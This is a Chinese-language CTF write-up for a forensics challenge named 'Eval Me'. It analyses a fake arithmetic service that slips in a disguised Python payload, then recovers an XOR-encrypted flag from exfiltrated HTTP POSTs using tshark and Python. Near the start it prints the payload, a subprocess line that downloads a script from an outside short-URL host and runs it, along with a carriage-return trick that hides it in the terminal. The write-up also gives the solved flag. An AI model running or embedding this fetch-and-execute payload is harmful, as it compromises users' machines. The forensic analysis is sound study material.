# Eval Me

## 题目简述

题目表面上是一个限时口算服务：客户端连续回答算术表达式，服务端会在中途混入一条经过排版伪装的 Python 表达式。附件同时提供网络抓包，真正目标是还原这段恶意命令所下载的脚本，并从明文 HTTP 外传流量中恢复 flag。

服务端在第 71 轮后发送的核心载荷为：

```python
__import__("subprocess").check_output(
    "(curl -sL https://shorturl.at/fgjvU -o extract.sh "
    "&& chmod +x extract.sh && bash extract.sh "
    "&& rm -f extract.sh)>/dev/null 2>&1||true",
    shell=True,
)
```

源码还在其后拼接 `\r#1 + 2` 和空格，使终端显示看起来仍像普通算式。载荷会下载并执行 `extract.sh`；解题时不需要实际访问或运行该外部脚本，因为官方材料已经给出其关键逻辑，抓包也完整保留了外传结果。

## 解题过程

### 还原外传算法

`extract.sh` 读取 `flag.txt`，使用固定 ASCII 密钥：

```text
s3k@1_v3ry_w0w
```

对 flag 逐字节执行循环 XOR。若 flag 字节为 $f_i$，密钥为 $k$，则密文字节为：

$$
c_i = f_i \oplus k_{i \bmod |k|}
$$

每个密文字节再编码成两位十六进制，并单独发送一个 HTTP POST：

```json
{"data":"3a"}
```

因此抓包中会出现一串按时间顺序排列的 JSON 请求，每个请求只承载一个密文字节。目标服务器使用明文 HTTP，没有 TLS 会话密钥或额外编码层。

### 从 PCAP 重组密文

使用 Tshark 仅保留 HTTP 请求并提取 JSON 字符串字段：

```bash
tshark -r capture.pcapng \
  -Y "http and http.request" \
  -T fields -e json.value.string
```

输出中的每一行都是两位十六进制。按抓包顺序连接所有字段、十六进制解码，再与固定密钥循环 XOR：

```python
from itertools import cycle

hex_bytes = """
把 tshark 输出按顺序粘贴到这里
""".replace("\n", "").strip()

ciphertext = bytes.fromhex(hex_bytes)
key = b"s3k@1_v3ry_w0w"
flag = bytes(value ^ mask for value, mask in zip(ciphertext, cycle(key)))
print(flag.decode())
```

也可以直接使用管道完成同样的重组，但需要保留包的原始顺序：

```bash
tshark -r capture.pcapng -Y "http and http.request" \
  -T fields -e json.value.string |
tr -d "\n"
```

解密结果为：

```text
SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}
```

## 方法总结

- 核心技巧：先从服务端源码识别回车覆盖造成的终端伪装，再按 HTTP 请求时间顺序重组逐字节外传的数据。
- 识别信号：下载执行临时脚本、固定 XOR 密钥、每次 POST 仅含一个两位十六进制字段，说明抓包中的多个请求共同组成一段密文。
- 复用要点：网络取证不能只看单包内容；应同时恢复载荷算法、字段编码和包序。外链脚本若已由本地证据完整还原，应把关键代码写入 WP，不依赖仍然在线的短链接。
